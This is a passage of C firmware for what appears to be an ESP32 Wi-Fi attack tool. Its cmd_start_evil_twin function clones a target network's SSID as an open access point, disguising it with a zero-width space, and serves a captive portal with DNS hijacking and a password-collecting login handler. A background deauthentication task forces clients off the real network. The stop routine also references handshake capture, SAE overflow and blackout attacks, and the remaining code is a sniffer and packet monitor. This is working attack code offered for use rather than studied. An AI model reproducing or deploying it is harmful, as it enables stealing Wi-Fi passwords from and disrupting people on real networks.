2) When password is entered in portal, stops deauth stream and attempts to connect to a network

*/
static int cmd_start_evil_twin(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    
    // Check if attack is already running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count > 0) {
        // Set application state based on attack type
        if (onlyDeauth) {
            applicationState = DEAUTH;
        } else {
            applicationState = DEAUTH_EVIL_TWIN;
            // Reset password wrong flag for new attack
            last_password_wrong = false;
        }

        const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
        evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
        if (evilTwinSSID != NULL) {
            strcpy(evilTwinSSID, sourceSSID);
        } else {
            ESP_LOGW(TAG,"Malloc error 4 SSID");
        }

        // Start portal before starting deauth attack
        if (!onlyDeauth) {
            MY_LOG_INFO(TAG,"Starting captive portal for Evil Twin attack on: %s", evilTwinSSID);
            
            // Get AP netif and stop DHCP to configure custom IP
            esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
            if (!ap_netif) {
                MY_LOG_INFO(TAG, "Failed to get AP netif");
                applicationState = IDLE;
                return 1;
            }
            
            // Stop DHCP server to configure custom IP
            esp_netif_dhcps_stop(ap_netif);
            
            // Set static IP 172.0.0.1 for AP
            esp_netif_ip_info_t ip_info;
            ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
            
            esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
            // Configure AP with Evil Twin SSID
            wifi_config_t ap_config = {
                .ap = {
                    .ssid = "",
                    .ssid_len = 0,
                    .channel = target_bssid_count > 0 ? target_bssids[0].channel : 1,
                    .password = "",
                    .max_connection = 4,
                    .authmode = WIFI_AUTH_OPEN
                }
            };
            
            // Copy original SSID and add Zero Width Space (U+200B) at the end
            // This prevents iPhone from grouping original and twin networks together
            size_t ssid_len = strlen(evilTwinSSID);
            if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
                // Copy original SSID
                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
                // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B)
                ap_config.ap.ssid[ssid_len] = 0xE2;
                ap_config.ap.ssid[ssid_len + 1] = 0x80;
                ap_config.ap.ssid[ssid_len + 2] = 0x8B;
                ap_config.ap.ssid_len = ssid_len + 3;
            } else {
                // SSID too long, just copy without Zero Width Space
                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen(evilTwinSSID);
            }
            
            // WiFi is already running in APSTA mode from wifi_init_ap_sta()
            // Just update the AP configuration
            ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
                applicationState = IDLE;
                return 1;
            }
            
            // Start DHCP server
            ret = esp_netif_dhcps_start(ap_netif);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
            // Wait a bit for AP to fully start
            vTaskDelay(pdMS_TO_TICKS(1000));
            
            // Configure HTTP server
            httpd_config_t config = HTTPD_DEFAULT_CONFIG();
            config.server_port = 80;
            config.max_open_sockets = 7;
            
            // Start HTTP server
            esp_err_t http_ret = httpd_start(&portal_server, &config);
            if (http_ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
                // Stop DHCP before returning
                esp_netif_dhcps_stop(ap_netif);
                applicationState = IDLE;
                return 1;
            }
            
            // Register URI handlers
            httpd_uri_t root_uri = {
                .uri = "/",
                .method = HTTP_GET,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_uri);
            
            httpd_uri_t root_post_uri = {
                .uri = "/",
                .method = HTTP_POST,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_post_uri);
            
            httpd_uri_t portal_uri = {
                .uri = "/portal",
                .method = HTTP_GET,
                .handler = portal_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &portal_uri);
            
            httpd_uri_t login_uri = {
                .uri = "/login",
                .method = HTTP_POST,
                .handler = login_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &login_uri);
            
            httpd_uri_t get_uri = {
                .uri = "/get",
                .method = HTTP_GET,
                .handler = get_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &get_uri);
            
            httpd_uri_t save_uri = {
                .uri = "/save",
                .method = HTTP_POST,
                .handler = save_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &save_uri);
            
            httpd_uri_t android_captive_uri = {
                .uri = "/generate_204",
                .method = HTTP_GET,
                .handler = android_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &android_captive_uri);
            
            httpd_uri_t ios_captive_uri = {
                .uri = "/hotspot-detect.html",
                .method = HTTP_GET,
                .handler = ios_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &ios_captive_uri);
            
            httpd_uri_t samsung_captive_uri = {
                .uri = "/ncsi.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &samsung_captive_uri);
            
            httpd_uri_t windows_captive_uri = {
                .uri = "/connecttest.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &windows_captive_uri);
            
            // Set portal_active flag BEFORE starting DNS task
            // (DNS task checks this flag in its loop)
            portal_active = true;
            
            // Start DNS server task
            BaseType_t dns_result = xTaskCreate(
                dns_server_task,
                "dns_server",
                4096,
                NULL,
                5,
                &dns_server_task_handle
            );
            
            if (dns_result != pdPASS) {
                MY_LOG_INFO(TAG, "Failed to create DNS server task");
                httpd_stop(portal_server);
                portal_server = NULL;
                portal_active = false;
                applicationState = IDLE;
                return 1;
            }
            
            MY_LOG_INFO(TAG, "Captive portal started successfully");
        }

        MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
        
        // Save target BSSIDs for channel monitoring
        save_target_bssids();
        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
        
        MY_LOG_INFO(TAG,"Deauth attack started. Use 'stop' to stop.");
        
        // Start deauth attack in background task
        deauth_attack_active = true;
        BaseType_t result = xTaskCreate(
            deauth_attack_task,
            "deauth_task",
            4096,  // Stack size
            NULL,
            5,     // Priority
            &deauth_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
            deauth_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"Evil twin: no selected APs (use select_networks).");
    }
    return 0;
}

static int cmd_stop(int argc, char **argv) {
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG, "Stop command received - stopping all operations...");
    
    // Set global stop flags
    operation_stop_requested = true;
    wardrive_active = false;

    // Stop packet monitor if running
    packet_monitor_stop();

    // Stop handshake attack task if running
    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping handshake attack task...");
        handshake_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && handshake_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (handshake_attack_task_handle != NULL) {
            vTaskDelete(handshake_attack_task_handle);
            handshake_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Handshake attack task forcefully stopped.");
        }
        
        // Stop any active handshake capture
        attack_handshake_stop();
        
        // Clean up state
        handshake_target_count = 0;
        handshake_current_index = 0;
        memset(handshake_targets, 0, sizeof(handshake_targets));
        memset(handshake_captured, 0, sizeof(handshake_captured));
    } else {
        // Stop handshake attack if running (old non-task mode)
        attack_handshake_stop();
    }

    // Stop channel view monitor if running
    channel_view_stop();
    
    // Stop deauth attack task if running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping deauth attack task...");
        deauth_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (deauth_attack_task_handle != NULL) {
            vTaskDelete(deauth_attack_task_handle);
            deauth_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
        }
        
        // Clear target BSSIDs
        target_bssid_count = 0;
        memset(target_bssids, 0, sizeof(target_bssids));
    }
    
    // Stop SAE overflow attack task if running
    if (sae_attack_active || sae_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping SAE overflow task...");
        sae_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && sae_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (sae_attack_task_handle != NULL) {
            vTaskDelete(sae_attack_task_handle);
            sae_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "SAE overflow task forcefully stopped.");
        }
    }
    
    // Stop blackout attack task if running
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping blackout attack task...");
        blackout_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && blackout_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (blackout_attack_task_handle != NULL) {
            vTaskDelete(blackout_attack_task_handle);
            blackout_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Blackout attack task forcefully stopped.");
        }
        
        // Clear target BSSIDs
        target_bssid_count = 0;
        memset(target_bssids, 0, sizeof(target_bssids));
    }
    
    // Stop any active attacks
    if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN || 
        applicationState == EVIL_TWIN_PASS_CHECK || applicationState == SAE_OVERFLOW) {
        MY_LOG_INFO(TAG, "Stopping active attack (state: %d)...", applicationState);
        applicationState = IDLE;
        
        // Disable promiscuous mode if it was enabled for SAE_OVERFLOW
        esp_wifi_set_promiscuous(false);
    } else {
        applicationState = IDLE;
    }
    
    // Stop background scan if in progress
    if (g_scan_in_progress) {
        esp_wifi_scan_stop();
        g_scan_in_progress = false;
        MY_LOG_INFO(TAG, "Background scan stopped.");
    }
    
    // Stop sniffer if active (keep collected data)
    if (sniffer_active) {
        sniffer_active = false;
        sniffer_scan_phase = false;
        esp_wifi_set_promiscuous(false);
        
        // Stop channel hopping task
        if (sniffer_channel_task_handle != NULL) {
            vTaskDelete(sniffer_channel_task_handle);
            sniffer_channel_task_handle = NULL;
            MY_LOG_INFO(TAG, "Stopped sniffer channel hopping task");
        }
        
        // Reset channel state for next session
        sniffer_channel_index = 0;
        sniffer_current_channel = dual_band_channels[0];
        sniffer_last_channel_hop = 0;
        
        // Reset selected networks mode state
        sniffer_selected_mode = false;
        sniffer_selected_channels_count = 0;
        memset(sniffer_selected_channels, 0, sizeof(sniffer_selected_channels));
        
        // Note: sniffer_aps and sniffer_ap_count are preserved for show_sniffer_results
        MY_LOG_INFO(TAG, "Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
    }
    
    // Stop sniffer_dog if active
    if (sniffer_dog_active || sniffer_dog_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping Sniffer Dog task...");
        sniffer_dog_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && sniffer_dog_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (sniffer_dog_task_handle != NULL) {
            vTaskDelete(sniffer_dog_task_handle);
            sniffer_dog_task_handle = NULL;
            MY_LOG_INFO(TAG, "Sniffer Dog task forcefully stopped.");
        }
        
        // Disable promiscuous mode
        esp_wifi_set_promiscuous(false);
        
        // Reset channel state
        sniffer_dog_channel_index = 0;
        sniffer_dog_current_channel = dual_band_channels[0];
        sniffer_dog_last_channel_hop = 0;
        
        MY_LOG_INFO(TAG, "Sniffer Dog stopped.");
    }
    
    // Stop wardrive task if running
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping wardrive task...");
        wardrive_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && wardrive_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (wardrive_task_handle != NULL) {
            vTaskDelete(wardrive_task_handle);
            wardrive_task_handle = NULL;
            MY_LOG_INFO(TAG, "Wardrive task forcefully stopped.");
        }
    }
    
    // Stop portal if active
    if (portal_active) {
        MY_LOG_INFO(TAG, "Stopping portal...");
        portal_active = false;
        
        // Stop DNS server task
        if (dns_server_task_handle != NULL) {
            // Wait for DNS task to finish (it checks portal_active flag)
            for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
                vTaskDelay(pdMS_TO_TICKS(100));
            }
            
            // Force cleanup if still running
            if (dns_server_task_handle != NULL) {
                vTaskDelete(dns_server_task_handle);
                dns_server_task_handle = NULL;
                if (dns_server_socket >= 0) {
                    close(dns_server_socket);
                    dns_server_socket = -1;
                }
            }
        }
        
        // Stop HTTP server
        if (portal_server != NULL) {
            httpd_stop(portal_server);
            portal_server = NULL;
            MY_LOG_INFO(TAG, "HTTP server stopped.");
        }
        
        // Stop DHCP server
        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_netif) {
            esp_netif_dhcps_stop(ap_netif);
        }
        
        // Stop AP mode
        esp_wifi_stop();
        MY_LOG_INFO(TAG, "Portal stopped.");
        
        // Clean up portal SSID
        if (portalSSID != NULL) {
            free(portalSSID);
            portalSSID = NULL;
        }
    }
    
    // Restore LED to idle (ignore errors if LED is in invalid state)
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after stop (state: %s), ignoring...", esp_err_to_name(led_err));
    }
    
    MY_LOG_INFO(TAG, "All operations stopped.");
    return 0;
}

static void packet_monitor_shutdown(void) {
    if (packet_monitor_promiscuous_owned) {
        esp_wifi_set_promiscuous(false);
        packet_monitor_promiscuous_owned = false;
    }

    if (packet_monitor_callback_installed) {
        esp_wifi_set_promiscuous_rx_cb(NULL);
        packet_monitor_callback_installed = false;
    }

    if (packet_monitor_has_prev_channel) {
        esp_wifi_set_channel(packet_monitor_prev_primary, packet_monitor_prev_secondary);
        packet_monitor_has_prev_channel = false;
    }
}

static void packet_monitor_stop(void) {
    if (!packet_monitor_active && packet_monitor_task_handle == NULL && !packet_monitor_promiscuous_owned && !packet_monitor_callback_installed) {
        return;
    }

    MY_LOG_INFO(TAG, "Stopping packet monitor...");

    packet_monitor_active = false;

    for (int i = 0; i < 40 && packet_monitor_task_handle != NULL; ++i) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (packet_monitor_task_handle != NULL) {
        vTaskDelete(packet_monitor_task_handle);
        packet_monitor_task_handle = NULL;
    }

    packet_monitor_shutdown();
    packet_monitor_total = 0;
}

static void packet_monitor_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    (void)buf;

    if (!packet_monitor_active) {
        return;
    }

    packet_monitor_total++;
}

static void packet_monitor_task(void *pvParameters) {
    (void)pvParameters;

    uint32_t last_total = 0;

    while (packet_monitor_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));

        if (!packet_monitor_active) {
            break;
        }

        uint32_t current = packet_monitor_total;
        uint32_t diff = current - last_total;
        last_total = current;

        printf("%" PRIu32 "pkts\n", diff);
        fflush(stdout);
    }

    packet_monitor_shutdown();
    packet_monitor_task_handle = NULL;
    packet_monitor_total = 0;
    packet_monitor_active = false;
    vTaskDelete(NULL);
}

static int cmd_packet_monitor(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: packet_monitor <channel>");
        return 1;
    }

    if (packet_monitor_active || packet_monitor_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Packet monitor already active. Use 'stop' to stop it first.");
        return 1;
    }

    char *endptr = NULL;
    long channel = strtol(argv[1], &endptr, 10);
    if (argv[1][0] == '\0' || (endptr != NULL && *endptr != '\0')) {
        MY_LOG_INFO(TAG, "Invalid channel argument. Usage: packet_monitor <channel>");
        return 1;
    }

    if (channel < 1 || channel > 165) {
        MY_LOG_INFO(TAG, "Channel must be between 1 and 165.");
        return 1;
    }

    if (sniffer_active || sniffer_scan_phase || sniffer_dog_active) {
        MY_LOG_INFO(TAG, "Sniffer is active. Use 'stop' to stop it first.");
        return 1;
    }

    if (applicationState != IDLE) {
        MY_LOG_INFO(TAG, "Another attack is active. Use 'stop' to stop it first.");
        return 1;
    }

    if (wardrive_active) {
        MY_LOG_INFO(TAG, "Wardrive is active. Use 'stop' to stop it first.");
        return 1;
    }

    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal is active. Use 'stop' to stop it first.");
        return 1;
    }

    esp_err_t err;
    uint8_t primary = 1;
    wifi_second_chan_t secondary = WIFI_SECOND_CHAN_NONE;
    err = esp_wifi_get_channel(&primary, &secondary);
    if (err == ESP_OK) {
        packet_monitor_prev_primary = primary;
        packet_monitor_prev_secondary = secondary;
        packet_monitor_has_prev_channel = true;
    } else {
        packet_monitor_has_prev_channel = false;
    }

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_DATA |
                       WIFI_PROMIS_FILTER_MASK_CTRL
    };

    esp_wifi_set_promiscuous(false);

    err = esp_wifi_set_promiscuous_filter(&filter);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set promiscuous filter: %s", esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }

    err = esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set channel %ld: %s", channel, esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }

    err = esp_wifi_set_promiscuous_rx_cb(packet_monitor_promiscuous_callback);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set promiscuous callback: %s", esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }
    packet_monitor_callback_installed = true;

    packet_monitor_total = 0;
    packet_monitor_active = true;

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        packet_monitor_active = false;
        MY_LOG_INFO(TAG, "Failed to enable promiscuous mode: %s", esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }
    packet_monitor_promiscuous_owned = true;

    BaseType_t task_ok = xTaskCreate(
        packet_monitor_task,
        "packet_monitor",
        2048,
        NULL,
        5,
        &packet_monitor_task_handle
    );

    if (task_ok != pdPASS) {
        packet_monitor_active = false;
        packet_monitor_task_handle = NULL;
        MY_LOG_INFO(TAG, "Failed to create packet monitor task.");
        packet_monitor_shutdown();
        return 1;
    }

    MY_LOG_INFO(TAG, "Packet monitor started on channel %ld. Type 'stop' to stop.", channel);

    esp_err_t led_err = led_set_color(255, 255, 255); // White for packet monitor
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for packet monitor: %s", esp_err_to_name(led_err));
    }
    return 0;
}

static void channel_view_publish_counts(void) {
    uint16_t counts24[CHANNEL_VIEW_24GHZ_CHANNEL_COUNT] = {0};
    uint16_t counts5[CHANNEL_VIEW_5GHZ_CHANNEL_COUNT] = {0};

    for (uint16_t i = 0; i < g_scan_count; ++i) {
        const wifi_ap_record_t *ap = &g_scan_results[i];
        uint8_t primary = ap->primary;
        if (primary >= 1 && primary <= 14) {
            counts24[primary - 1]++;
        } else {
            for (size_t idx = 0; idx < CHANNEL_VIEW_5GHZ_CHANNEL_COUNT; ++idx) {
                if (channel_view_5ghz_channels[idx] == primary) {
                    counts5[idx]++;
                    break;
                }
            }
        }
    }

    MY_LOG_INFO(TAG, "channel_view_start");
    MY_LOG_INFO(TAG, "band:24");
    for (size_t i = 0; i < CHANNEL_VIEW_24GHZ_CHANNEL_COUNT; ++i) {
        MY_LOG_INFO(TAG, "ch%u:%u", channel_view_24ghz_channels[i], counts24[i]);
    }
    MY_LOG_INFO(TAG, "band:5");
    for (size_t i = 0; i < CHANNEL_VIEW_5GHZ_CHANNEL_COUNT; ++i) {
        MY_LOG_INFO(TAG, "ch%u:%u", channel_view_5ghz_channels[i], counts5[i]);
    }
    MY_LOG_INFO(TAG, "channel_view_end");
}

static void channel_view_task(void *pvParameters) {
    (void)pvParameters;

    const TickType_t scan_delay = pdMS_TO_TICKS(CHANNEL_VIEW_SCAN_DELAY_MS);
    const TickType_t wait_slice = pdMS_TO_TICKS(100);

    while (channel_view_active && !operation_stop_requested) {
        esp_err_t err = start_background_scan();
        if (err != ESP_OK) {
            MY_LOG_INFO(TAG, "channel_view_error:scan_start %s", esp_err_to_name(err));
            break;
        }

        int wait_iterations = 0;
        while (channel_view_active && g_scan_in_progress &&
               wait_iterations < CHANNEL_VIEW_SCAN_TIMEOUT_ITERATIONS) {
            vTaskDelay(wait_slice);
            wait_iterations++;
        }

        if (!channel_view_active || operation_stop_requested) {
            break;
        }

        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "channel_view_error:timeout");
            esp_wifi_scan_stop();
        } else {
            channel_view_publish_counts();
        }

        if (!channel_view_active || operation_stop_requested) {
            break;
        }

        vTaskDelay(scan_delay);
    }

    channel_view_scan_mode = false;
    channel_view_active = false;
    channel_view_task_handle = NULL;
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore LED after channel view: %s", esp_err_to_name(led_err));
    }
    MY_LOG_INFO(TAG, "Channel view monitor stopped.");
    vTaskDelete(NULL);
}

static void channel_view_stop(void) {
    if (!channel_view_active && channel_view_task_handle == NULL && !channel_view_scan_mode) {
        return;
    }

    channel_view_active = false;
    if (channel_view_scan_mode && g_scan_in_progress) {
        esp_wifi_scan_stop();
    }

    for (int i = 0; i < 40 && channel_view_task_handle != NULL; ++i) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (channel_view_task_handle != NULL) {
        vTaskDelete(channel_view_task_handle);
        channel_view_task_handle = NULL;
    }

    channel_view_scan_mode = false;
    MY_LOG_INFO(TAG, "Channel view stopped.");
}

static int cmd_channel_view(int argc, char **argv) {
    (void)argc;
    (void)argv;

    if (channel_view_active || channel_view_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Channel view already running. Use 'stop' to stop it first.");
        return 1;
    }

    if (packet_monitor_active || packet_monitor_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Packet monitor is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (sniffer_active || sniffer_scan_phase || sniffer_dog_active) {
        MY_LOG_INFO(TAG, "Sniffer operations are active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (wardrive_active) {
        MY_LOG_INFO(TAG, "Wardrive is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (applicationState != IDLE) {
        MY_LOG_INFO(TAG, "Another attack is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan already in progress. Wait for it to finish or use 'stop'.");
        return 1;
    }

    operation_stop_requested = false;
    channel_view_active = true;
    channel_view_scan_mode = true;
    BaseType_t task_ok =
        xTaskCreate(channel_view_task, "channel_view", 4096, NULL, 5, &channel_view_task_handle);

    if (task_ok != pdPASS) {
        channel_view_active = false;
        channel_view_scan_mode = false;
        channel_view_task_handle = NULL;
        MY_LOG_INFO(TAG, "Failed to create channel view task.");
        return 1;
    }

    esp_err_t led_err = led_set_color(128, 0, 255); // purple-ish to indicate analyzer
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for channel view: %s", esp_err_to_name(led_err));
    }

    MY_LOG_INFO(TAG, "Channel view started. Type 'stop' to stop it.");
    return 0;
}

static int cmd_start_sniffer(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    if (sniffer_active) {
        MY_LOG_INFO(TAG, "Sniffer already active. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Clear previous sniffer data when starting new session
    sniffer_ap_count = 0;
    memset(sniffer_aps, 0, sizeof(sniffer_aps));
    probe_request_count = 0;
    memset(probe_requests, 0, sizeof(probe_requests));
    sniffer_selected_channels_count = 0;
    memset(sniffer_selected_channels, 0, sizeof(sniffer_selected_channels));
    sniffer_packet_counter = 0;
    sniffer_last_debug_packet = 0;
    
    // Check if networks were selected
    if (g_selected_count > 0 && g_scan_done) {
        // Selected networks mode - skip scan, use selected networks only
        MY_LOG_INFO(TAG, "Starting sniffer in SELECTED NETWORKS mode...");
        MY_LOG_INFO(TAG, "Will monitor %d pre-selected network(s)", g_selected_count);
        
        sniffer_active = true;
        sniffer_scan_phase = false; // Skip scan phase
        sniffer_selected_mode = true;
        
        // Initialize sniffer with selected networks
        sniffer_init_selected_networks();
        
        if (sniffer_ap_count == 0 || sniffer_selected_channels_count == 0) {
            MY_LOG_INFO(TAG, "Failed to initialize selected networks for sniffer");
            sniffer_active = false;
            sniffer_selected_mode = false;
            return 1;
        }
        
        // Set LED to green for active sniffing
        esp_err_t led_err = led_set_color(0, 255, 0); // Green
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED for sniffer: %s", esp_err_to_name(led_err));
        }
        
        // Set promiscuous filter
        esp_wifi_set_promiscuous_filter(&sniffer_filter);
        
        // Enable promiscuous mode
        esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
        esp_wifi_set_promiscuous(true);
        
        // Initialize channel hopping with selected channels
        sniffer_channel_index = 0;
        sniffer_current_channel = sniffer_selected_channels[0];
        sniffer_last_channel_hop = esp_timer_get_time() / 1000;
        esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
        
        // Start channel hopping task
        if (sniffer_channel_task_handle == NULL) {
            xTaskCreate(sniffer_channel_task, "sniffer_channel", 2048, NULL, 5, &sniffer_channel_task_handle);
            MY_LOG_INFO(TAG, "Started sniffer channel hopping task");
        }
        
        MY_LOG_INFO(TAG, "Sniffer: Now monitoring selected networks (no scan performed)");
        MY_LOG_INFO(TAG, "Use 'show_sniffer_results' to see captured clients or 'stop' to stop.");
        
    } else {
        // Normal mode - scan all networks
        MY_LOG_INFO(TAG, "Starting sniffer in NORMAL mode (scanning all networks)...");
        
        sniffer_active = true;
        sniffer_scan_phase = true;
        sniffer_selected_mode = false;
        
        // Set LED (ignore errors if LED is in invalid state)
        esp_err_t led_err = led_set_color(255, 255, 0); // Yellow
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED for sniffer: %s", esp_err_to_name(led_err));
        }
        
        esp_err_t err = start_background_scan();
        if (err != ESP_OK) {
            sniffer_active = false;
            sniffer_scan_phase = false;
            sniffer_selected_mode = false;
            
            // Return LED to idle (ignore errors if LED is in invalid state)
            led_err = led_set_idle();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to restore idle LED after sniffer failure: %s", esp_err_to_name(led_err));
            }
            
            MY_LOG_INFO(TAG, "Failed to start scan for sniffer: %s", esp_err_to_name(err));
            return 1;
        }
        
        MY_LOG_INFO(TAG, "Sniffer started - scanning networks...");
        MY_LOG_INFO(TAG, "Use 'show_sniffer_results' to see captured clients or 'stop' to stop.");
    }
    
    return 0;
}

static int cmd_show_sniffer_results(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Allow showing results even after sniffer is stopped
    if (sniffer_active && sniffer_scan_phase) {
        MY_LOG_INFO(TAG, "Sniffer is still scanning networks. Please wait...");
        return 0;
    }
    
    if (sniffer_ap_count == 0) {
        MY_LOG_INFO(TAG, "No sniffer data available. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    // Create a sorted array of AP indices by client count (descending)
    int sorted_indices[MAX_SNIFFER_APS];
    for (int i = 0; i < sniffer_ap_count; i++) {
        sorted_indices[i] = i;
    }
    
    // Simple bubble sort by client count (descending)
    for (int i = 0; i < sniffer_ap_count - 1; i++) {
        for (int j = 0; j < sniffer_ap_count - i - 1; j++) {
            if (sniffer_aps[sorted_indices[j]].client_count < sniffer_aps[sorted_indices[j + 1]].client_count) {
                int temp = sorted_indices[j];
                sorted_indices[j] = sorted_indices[j + 1];
                sorted_indices[j + 1] = temp;
            }
        }
    }
    
    // Compact format for Flipper Zero display
    int displayed_count = 0;
    for (int i = 0; i < sniffer_ap_count; i++) {
        int idx = sorted_indices[i];
        sniffer_ap_t *ap = &sniffer_aps[idx];
        
        // Skip broadcast BSSID and our own device
        if (is_broadcast_bssid(ap->bssid) || is_own_device_mac(ap->bssid)) {
            continue;
        }
        
        // Skip APs with no clients
        if (ap->client_count == 0) {
            continue;
        }
        
        displayed_count++;
        
        // Print AP info in compact format: SSID, CH: CLIENT_COUNT
